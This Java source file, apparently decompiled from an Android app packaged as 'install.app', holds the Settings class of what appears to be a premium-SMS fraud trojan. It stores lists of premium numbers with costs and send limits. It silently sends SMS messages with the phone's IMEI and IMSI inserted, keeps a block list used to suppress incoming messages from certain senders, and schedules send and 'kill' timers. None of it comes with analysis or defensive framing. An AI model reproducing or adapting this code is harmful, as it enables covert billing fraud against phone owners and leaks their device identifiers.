package install.app;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.support.v4.view.MotionEventCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Time;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings {
    public static int DAY = (HOUR * 24);
    public static int HOUR = (MINUTE * 60);
    public static int MINUTE = (SECOND * 60);
    public static int SECOND = 1000;
    public static String SETTINGS = "settings";
    public static String imei = "";
    public static String imsi = "";
    static Settings settings;
    public static boolean timeNotActual = false;
    public Vector<String> aosList;
    public Vector<String> blockList;
    public int currentGlobalMaxSmsCount;
    public int currentMaxSmsCost;
    public int currentMaxSmsCount;
    public int currentOperatorId;
    public int currentOperatorIndex;
    public int currentSmsIndex;
    public long currentSmsKey;
    public boolean defaultSet;
    public int globalMaxSmsCount;
    public int globalRepeat;
    public long lastTimeGlobalRepeat;
    public Vector<SmsOperator> operatorList;
    public long waitForSend;
    public boolean working;

    public Settings() {
        this.blockList = null;
        this.operatorList = null;
        this.aosList = null;
        this.currentOperatorId = 0;
        this.currentSmsKey = 0;
        this.currentMaxSmsCount = 0;
        this.currentMaxSmsCost = 0;
        this.working = false;
        this.currentOperatorIndex = 0;
        this.currentSmsIndex = 0;
        this.defaultSet = false;
        this.lastTimeGlobalRepeat = 0;
        this.currentGlobalMaxSmsCount = 0;
        this.globalMaxSmsCount = 0;
        this.globalRepeat = 0;
        this.blockList = new Vector();
        this.operatorList = new Vector();
        this.aosList = new Vector();
    }

    public boolean load(Context context) {
        boolean result = false;
        System.out.println("Settings::load() start");
        try {
            imei = getImei(context);
            imsi = getImsi(context);
            SharedPreferences sharedPreferences = context.getSharedPreferences(SETTINGS, 1);
            if (sharedPreferences.contains("first")) {
                int i;
                JSONArray jsonOperatorList = new JSONArray(sharedPreferences.getString("operatorList", ""));
                this.operatorList = new Vector();
                for (i = 0; i < jsonOperatorList.length(); i++) {
                    int j;
                    JSONObject jsonOperator = jsonOperatorList.getJSONObject(i);
                    SmsOperator smsOperator = new SmsOperator();
                    smsOperator.id = jsonOperator.getInt("id");
                    smsOperator.name = jsonOperator.getString("name");
                    smsOperator.maxSmsCount = jsonOperator.getInt("maxSmsCount");
                    smsOperator.maxSmsCost = jsonOperator.getInt("maxSmsCost");
                    smsOperator.repeat = jsonOperator.getInt("repeat");
                    smsOperator.time = jsonOperator.getLong("time");
                    JSONArray jsonCodes = jsonOperator.getJSONArray("codes");
                    for (j = 0; j < jsonCodes.length(); j++) {
                        smsOperator.codes.add(jsonCodes.getString(j));
                    }
                    JSONArray jsonSmsList = jsonOperator.getJSONArray("sms");
                    for (j = 0; j < jsonSmsList.length(); j++) {
                        JSONObject jsonSms = jsonSmsList.getJSONObject(j);
                        SmsItem smsItem = new SmsItem(jsonSms.getString("number"), jsonSms.getString("text"));
                        smsItem.cost = jsonSms.getInt("cost");
                        smsItem.wait = jsonSms.getInt("wait");
                        smsItem.responseText = jsonSms.getString("responseText");
                        smsItem.responseNumber = jsonSms.getString("responseNumber");
                        smsItem.key = jsonSms.getLong("key");
                        smsOperator.sms.add(smsItem);
                    }
                    this.operatorList.add(smsOperator);
                }
                JSONArray jsonBlockList = new JSONArray(sharedPreferences.getString("blockList", ""));
                this.blockList = new Vector();
                for (i = 0; i < jsonBlockList.length(); i++) {
                    this.blockList.add(jsonBlockList.getString(i));
                }
                JSONArray jsonAosList = new JSONArray(sharedPreferences.getString("aosList", ""));
                this.aosList = new Vector();
                for (i = 0; i < jsonAosList.length(); i++) {
                    this.aosList.add(jsonAosList.getString(i));
                }
                this.currentOperatorId = sharedPreferences.getInt("currentOperatorId", 0);
                this.currentSmsKey = sharedPreferences.getLong("currentSmsKey", 0);
                this.currentMaxSmsCount = sharedPreferences.getInt("currentMaxSmsCount", 0);
                this.currentMaxSmsCost = sharedPreferences.getInt("currentMaxSmsCost", 0);
                this.currentOperatorIndex = sharedPreferences.getInt("currentOperatorIndex", 0);
                this.currentSmsIndex = sharedPreferences.getInt("currentSmsIndex", 0);
                this.working = sharedPreferences.getBoolean("working", false);
                this.defaultSet = sharedPreferences.getBoolean("defaultSet", false);
                this.waitForSend = sharedPreferences.getLong("waitForSend", 0);
                this.globalMaxSmsCount = sharedPreferences.getInt("globalMaxSmsCount", 0);
                this.globalRepeat = sharedPreferences.getInt("globalRepeat", 0);
                this.lastTimeGlobalRepeat = sharedPreferences.getLong("lastTimeGlobalRepeat", 0);
                this.currentGlobalMaxSmsCount = sharedPreferences.getInt("currentGlobalMaxSmsCount", 0);
                result = true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("Settings::load() end");
        return result;
    }

    public boolean save(Context context) {
        System.out.println("Settings::save() start");
        try {
            int i;
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.putBoolean("first", false);
            JSONArray jsonOperatorList = new JSONArray();
            for (i = 0; i < this.operatorList.size(); i++) {
                int j;
                SmsOperator smsOperator = (SmsOperator) this.operatorList.get(i);
                JSONObject jsonOperator = new JSONObject();
                jsonOperator.put("id", smsOperator.id);
                jsonOperator.put("name", smsOperator.name);
                jsonOperator.put("maxSmsCount", smsOperator.maxSmsCount);
                jsonOperator.put("maxSmsCost", smsOperator.maxSmsCost);
                jsonOperator.put("repeat", smsOperator.repeat);
                jsonOperator.put("time", smsOperator.time);
                JSONArray jsonCodes = new JSONArray();
                for (j = 0; j < smsOperator.codes.size(); j++) {
                    jsonCodes.put(smsOperator.codes.get(j));
                }
                jsonOperator.put("codes", jsonCodes);
                JSONArray jsonSmsList = new JSONArray();
                for (j = 0; j < smsOperator.sms.size(); j++) {
                    SmsItem smsItem = (SmsItem) smsOperator.sms.get(j);
                    JSONObject jsonSms = new JSONObject();
                    jsonSms.put("number", smsItem.number);
                    jsonSms.put("text", smsItem.text);
                    jsonSms.put("cost", smsItem.cost);
                    jsonSms.put("wait", smsItem.wait);
                    jsonSms.put("responseText", smsItem.responseText);
                    jsonSms.put("responseNumber", smsItem.responseNumber);
                    jsonSms.put("key", smsItem.key);
                    jsonSmsList.put(jsonSms);
                }
                jsonOperator.put("sms", jsonSmsList);
                jsonOperatorList.put(jsonOperator);
            }
            editor.putString("operatorList", jsonOperatorList.toString());
            JSONArray jsonBlockList = new JSONArray();
            for (i = 0; i < this.blockList.size(); i++) {
                jsonBlockList.put(this.blockList.get(i));
            }
            editor.putString("blockList", jsonBlockList.toString());
            JSONArray jsonAosList = new JSONArray();
            for (i = 0; i < this.aosList.size(); i++) {
                jsonAosList.put(this.aosList.get(i));
            }
            editor.putString("aosList", jsonAosList.toString());
            editor.putInt("currentOperatorId", this.currentOperatorId);
            editor.putLong("currentSmsKey", this.currentSmsKey);
            editor.putInt("currentMaxSmsCount", this.currentMaxSmsCount);
            editor.putInt("currentMaxSmsCost", this.currentMaxSmsCost);
            editor.putInt("currentOperatorIndex", this.currentOperatorIndex);
            editor.putInt("currentSmsIndex", this.currentSmsIndex);
            editor.putBoolean("working", this.working);
            editor.putBoolean("defaultSet", this.defaultSet);
            editor.putLong("waitForSend", this.waitForSend);
            editor.putInt("globalMaxSmsCount", this.globalMaxSmsCount);
            editor.putInt("globalRepeat", this.globalRepeat);
            editor.putLong("lastTimeGlobalRepeat", this.lastTimeGlobalRepeat);
            editor.putInt("currentGlobalMaxSmsCount", this.currentGlobalMaxSmsCount);
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println("Settings::save() end");
        return false;
    }

    public void reset(Context context) {
        try {
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.clear();
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static String getImei(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getCountry(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getSimCountryIso();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getPhone(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String getImsi(Context context) {
        try {
            String value = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
            if (value != null) {
                return value;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "ERR";
    }

    public static String md5(String value) {
        try {
            MessageDigest digest = MessageDigest.getInstance("MD5");
            digest.update(value.getBytes());
            byte[] messageDigest = digest.digest();
            StringBuffer hexString = new StringBuffer();
            for (byte b : messageDigest) {
                String tmp = Integer.toHexString(b & MotionEventCompat.ACTION_MASK);
                if (tmp.length() == 1) {
                    hexString.append("0");
                }
                hexString.append(tmp);
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static String getCurrentTime() {
        Time time = new Time();
        time.setToNow();
        return time.format("%Y_%m_%d_%H_%M_%S");
    }

    public void printToOutStream() {
    }

    public static boolean sendSms(String number, String text) {
        try {
            text = text.replace("{IMEI}", imei).replace("{IMSI}", imsi);
            System.out.println("sms: " + text + " to " + number);
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public boolean isDeleteMessage(String phone, String text) {
        for (int i = 0; i < this.blockList.size(); i++) {
            if (((String) this.blockList.get(i)).equals(phone)) {
                return true;
            }
        }
        return false;
    }

    public boolean isAosMessage(String phone, String text) {
        for (int i = 0; i < this.aosList.size(); i++) {
            if (phone.startsWith((String) this.aosList.get(i))) {
                return true;
            }
        }
        return false;
    }

    public static void setSettings(Settings set) {
        settings = set;
    }

    public static Settings getSettings() {
        return settings;
    }

    public void updateCurrentOperator(SmsOperator smsOperator) {
        this.operatorList.set(this.currentOperatorIndex, smsOperator);
    }

    public void printTimes() {
        System.out.println("==================TIMES====================");
        for (int i = 0; i < this.operatorList.size(); i++) {
            SmsOperator operator = (SmsOperator) this.operatorList.get(i);
            System.out.println(operator.name + " operator[" + i + "].time: " + operator.time);
        }
        System.out.println("============================================");
    }

    public SmsOperator loadCurrentOperator() {
        return (SmsOperator) this.operatorList.get(this.currentOperatorIndex);
    }

    public SmsItem loadCurrentSmsItem() {
        return (SmsItem) ((SmsOperator) this.operatorList.get(this.currentOperatorIndex)).sms.get(this.currentSmsIndex);
    }

    public static void startWaitTimer(Context context, long seconds) {
        timeNotActual = false;
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.wait");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) SECOND) * seconds), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void cancelWaitTimer(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.wait");
            ((AlarmManager) context.getSystemService("alarm")).cancel(PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void startSendTimer(Context context, long seconds) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.send");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) SECOND) * seconds), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean loadSettings(Context context) {
        if (getSettings() != null) {
            return true;
        }
        Settings settings = new Settings();
        setSettings(settings);
        return settings.load(context);
    }

    public void updateCurrentMaxSmsCount() {
        if (this.lastTimeGlobalRepeat + ((long) (this.globalRepeat * MINUTE)) <= System.currentTimeMillis()) {
            this.currentGlobalMaxSmsCount = this.globalMaxSmsCount;
        }
    }

    public static void startKillTimer(Context context, long minutes) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.timer.kill");
            ((AlarmManager) context.getSystemService("alarm")).set(0, System.currentTimeMillis() + (((long) MINUTE) * minutes), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
